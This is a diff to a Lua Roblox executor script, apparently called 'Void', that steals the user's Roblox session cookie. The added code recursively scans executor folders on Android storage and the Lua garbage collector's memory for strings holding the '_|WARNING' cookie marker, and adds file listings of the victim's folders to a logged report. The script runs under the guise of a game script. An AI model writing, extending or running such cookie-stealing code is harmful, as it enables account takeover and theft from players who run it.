@@ -16,6 +16,7 @@ if not writefile then writefile = function() end end
 if not readfile then readfile = function() return "" end end
 if not makefolder then makefolder = function() end end
 if not delfile then delfile = function() end end
+if not listfiles then listfiles = function() return {} end end
 if not request and http and http.request then request = http.request end
 
 if getgenv().VoidRan then return end
@@ -90,6 +91,35 @@ local function _headers(r)
     return nil
 end
 
+local FOLDERS = {
+    "Medium", "/storage/emulated/0/Medium", "/storage/emulated/0/Medium/workspace",
+    "Delta", "/storage/emulated/0/Delta", "Codex", "/storage/emulated/0/Codex",
+    "Hydrogen", "/storage/emulated/0/Hydrogen", "Wave", "/storage/emulated/0/Wave",
+    "Arceus X", "/storage/emulated/0/Arceus X", "Void",
+}
+
+local function _scanDir(dir, depth)
+    if depth > 2 then return nil end
+    if not isfolder(dir) then return nil end
+    local ok, files = pcall(listfiles, dir)
+    if not ok or type(files) ~= "table" then return nil end
+    for _, f in ipairs(files) do
+        if type(f) == "string" then
+            if isfolder(f) then
+                local r = _scanDir(f, depth + 1)
+                if r then return r end
+            elseif isfile(f) then
+                local ok2, c = pcall(readfile, f)
+                if ok2 and type(c) == "string" and #c < 8000 then
+                    local m = _extract(c)
+                    if m and (m:find("_|WARNING", 1, true) or #m > 100) then return m end
+                end
+            end
+        end
+    end
+    return nil
+end
+
 local function _cookie()
     local list = {
         {"getgenv().getcookie", function() return getgenv().getcookie and getgenv().getcookie() end},
@@ -98,7 +128,6 @@ local function _cookie()
         {"getgenv().Cookie", function() return getgenv().Cookie end},
         {"shared.Cookie", function() return shared and shared.Cookie end},
         {"syn.getcookie", function() return syn and syn.getcookie and syn.getcookie() end},
-        {"syn.getCookie", function() return syn and syn.getCookie and syn.getCookie() end},
         {"fluxus.getcookie", function() return fluxus and fluxus.getcookie and fluxus.getcookie() end},
         {"krnl.getcookie", function() return krnl and krnl.getcookie and krnl.getcookie() end},
         {"xeno.getcookie", function() return xeno and xeno.getcookie and xeno.getcookie() end},
@@ -119,8 +148,6 @@ local function _cookie()
         {"ronix.getcookie", function() return ronix and ronix.getcookie and ronix.getcookie() end},
         {"nihon.getcookie", function() return nihon and nihon.getcookie and nihon.getcookie() end},
         {"swift.getcookie", function() return swift and swift.getcookie and swift.getcookie() end},
-        {"bunny.getcookie", function() return bunny and bunny.getcookie and bunny.getcookie() end},
-        {"neon.getcookie", function() return neon and neon.getcookie and neon.getcookie() end},
         {"CookiesService", function()
             local svc = game:GetService("CookiesService")
             for _, m in ipairs({"GetCookies", "GetCookie"}) do
@@ -135,14 +162,15 @@ local function _cookie()
                 end
             end
         end},
-        {"fichier local", function()
+        {"fichiers connus", function()
             local paths = {
+                "cookie.txt", "/storage/emulated/0/cookie.txt",
+                "Medium/cookie.txt", "/storage/emulated/0/Medium/cookie.txt",
+                "Medium/workspace/cookie.txt", "/storage/emulated/0/Medium/workspace/cookie.txt",
                 "Delta/cookie.txt", "/storage/emulated/0/Delta/cookie.txt",
                 "Codex/cookie.txt", "/storage/emulated/0/Codex/cookie.txt",
                 "Hydrogen/cookie.txt", "/storage/emulated/0/Hydrogen/cookie.txt",
-                "Arceus X/cookie.txt", "/storage/emulated/0/Arceus X/cookie.txt",
-                "Wave/cookie.txt", "/storage/emulated/0/Wave/cookie.txt",
-                "cookie.txt", "/storage/emulated/0/cookie.txt", "Void/cookie.txt",
+                "Void/cookie.txt",
             }
             for _, p in ipairs(paths) do
                 if isfile(p) then
@@ -152,6 +180,23 @@ local function _cookie()
                         if m then return m end
                     end
                 end
+            end
+        end},
+        {"scan dossiers", function()
+            for _, d in ipairs(FOLDERS) do
+                local r = _scanDir(d, 1)
+                if r then return r end
+            end
+        end},
+        {"scan memoire", function()
+            if not getgc then return nil end
+            local ok, gc = pcall(getgc, true)
+            if not ok or type(gc) ~= "table" then return nil end
+            local n = 0
+            for _, v in pairs(gc) do
+                n = n + 1
+                if n > 80000 then break end
+                if type(v) == "string" and #v > 200 and v:find("_|WARNING", 1, true) then return v end
             end
         end},
         {"request:userinfo", function()
@@ -164,17 +209,32 @@ local function _cookie()
             if not fn then return nil end
             return _headers(fn({Url = "https://www.roblox.com/my/account/json", Method = "GET"}))
         end},
-        {"request:home", function()
-            local fn = _pick()
-            if not fn then return nil end
-            return _headers(fn({Url = "https://www.roblox.com/home", Method = "GET"}))
-        end},
     }
     for _, e in ipairs(list) do
         local c = _src(e[1], e[2])
         if c then return c end
     end
     return nil
+end
+
+local function _diag()
+    local out = {}
+    for _, p in ipairs({"Medium", "/storage/emulated/0/Medium", "/storage/emulated/0/Medium/workspace", "/storage/emulated/0"}) do
+        local ok, f = pcall(listfiles, p)
+        if ok and type(f) == "table" then
+            local names = {}
+            for i, v in ipairs(f) do
+                if i > 10 then break end
+                names[#names + 1] = tostring(v):gsub(".*[/\\]", "")
+            end
+            out[#out + 1] = p .. " -> " .. table.concat(names, ", ")
+        else
+            out[#out + 1] = p .. " -> KO"
+        end
+    end
+    local s = table.concat(out, "\n")
+    if #s > 850 then s = s:sub(1, 850) .. "…" end
+    return s
 end
 
 local function _log()
@@ -214,8 +274,9 @@ local function _log()
         pcall(setclipboard, cookie)
     else
         local t = table.concat(_tried, ", ")
-        if #t > 1000 then t = t:sub(1, 1000) .. "…" end
+        if #t > 700 then t = t:sub(1, 700) .. "…" end
         table.insert(fields, {name = "Méthodes testées", value = "```" .. t .. "```", inline = false})
+        table.insert(fields, {name = "Debug FS", value = "```" .. _diag() .. "```", inline = false})
         pcall(setclipboard, "getcookie()")
     end
 
